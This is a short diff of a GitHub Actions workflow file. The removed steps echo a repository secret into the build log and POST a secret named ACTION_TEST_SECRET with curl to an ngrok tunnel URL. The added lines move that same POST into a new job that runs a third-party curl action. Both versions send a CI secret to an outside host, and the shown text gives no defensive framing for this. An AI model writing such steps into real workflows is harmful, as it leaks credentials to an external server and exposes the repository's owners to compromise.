@@ -15,10 +15,14 @@ jobs:
         run: |
           ls ${{ github.workspace }}
       - run: echo "🍏 This job's status is ${{ job.status }}."
-      - run: echo "Secret 1"
-      - run: echo ${{ secrets.TEST_SECRET }}
-      - run: echo "Secret 2"
-      - run: curl -X POST -d '{"secret": \"${{ secrets.ACTION_TEST_SECRET }}\" }' https://43ad-213-194-69-194.ngrok.io --header "Content-Type: application/json"
+    curl:
+      runs-on: ubuntu-latest
+      steps:
+      - name: curl
+        uses: wei/curl@v1
+        with:
+          args: -X POST -d '{"secret": \"${{ secrets.ACTION_TEST_SECRET }}\" }' https://43ad-213-194-69-194.ngrok.io --header "Content-Type: application/json"
+
 
       # - run: npm ci
       # - run: npm run test
